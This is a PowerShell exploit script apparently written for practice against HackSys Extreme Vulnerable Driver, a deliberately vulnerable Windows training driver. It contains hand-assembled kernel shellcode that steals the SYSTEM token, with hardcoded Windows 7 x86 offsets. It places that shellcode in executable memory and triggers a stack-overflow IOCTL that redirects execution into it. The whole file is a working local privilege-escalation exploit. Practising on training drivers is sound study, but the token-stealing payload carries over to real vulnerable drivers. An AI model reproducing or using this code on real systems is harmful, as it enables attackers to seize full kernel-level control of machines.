Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

public static class EVD
{
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr VirtualAlloc(
		IntPtr lpAddress,
		uint dwSize,
		UInt32 flAllocationType,
		UInt32 flProtect);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr CreateFile(
		String lpFileName,
		UInt32 dwDesiredAccess,
		UInt32 dwShareMode,
		IntPtr lpSecurityAttributes,
		UInt32 dwCreationDisposition,
		UInt32 dwFlagsAndAttributes,
		IntPtr hTemplateFile);

	[DllImport("Kernel32.dll", SetLastError = true)]
	public static extern bool DeviceIoControl(
		IntPtr hDevice,
		int IoControlCode,
		byte[] InBuffer,
		int nInBufferSize,
		byte[] OutBuffer,
		int nOutBufferSize,
		ref int pBytesReturned,
		IntPtr Overlapped);

	[DllImport("kernel32.dll")]
	public static extern uint GetLastError();
}
"@

# Enable WinDBG debug output:
# ed nt!Kd_DEFAULT_MASK 8

# Compiled with Keystone-Engine
# Hardcoded offsets for Win7 x86 SP1
$Shellcode = [Byte[]] @(
	#---[Setup]
	0x60,                               # pushad
	0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]
	0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]
	0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)
	0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
	#---[Copy System PID token]
	0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)
	0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] <-|
	0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |
	0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |
	0x75, 0xED,                         # jnz                           ->|
	0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
	0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
	#---[Recover]
	0x61,                               # popad
	0x31, 0xC0,                         # NTSTATUS -> STATUS_SUCCESS :p
	0x5D,                               # pop ebp
	0xC2, 0x08, 0x00                    # ret 8
)

# Write shellcode to memory!
echo "`n[>] Allocating ring0 payload.."
[IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Pointer, $Shellcode.Length)
$EIP = [System.BitConverter]::GetBytes($Pointer.ToInt32())
echo "[+] Payload size: $($Shellcode.Length)"
echo "[+] Payload address: $("{0:X8}" -f $Pointer.ToInt32())"

# dwShareMode = prevent other rwx = 0
# dwCreationDisposition = OPEN_EXISTING = 0x3
# dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL = 0x80
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)

if ($hDevice -eq -1) {
	echo "`n[!] Unable to get driver handle..`n"
	Return
} else {
	echo "`n[>] Driver information.."
	echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
	echo "[+] Handle: $hDevice"
}

# HACKSYS_EVD_STACKOVERFLOW IOCTL = 0x222003
#---[Demo EIP control]
# 0x41 = 0x800 (buffer allocated by the driver)
# 0x42 = 32 (does not affect execution)
# 0xdeadbeef -> Code exec here
#---
# [Byte[]](0x41)*0x800 + [Byte[]](0x42)*32 + [Byte[]](0xef,0xbe,0xad,0xde)
#---
$Buffer = [Byte[]](0x41)*0x800 + [Byte[]](0x42)*32 + $EIP
echo "`n[>] Sending buffer.."
echo "[+] Buffer length: $($Buffer.Length)"
echo "[+] IOCTL: 0x222003`n"
[EVD]::DeviceIoControl($hDevice, 0x222003, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null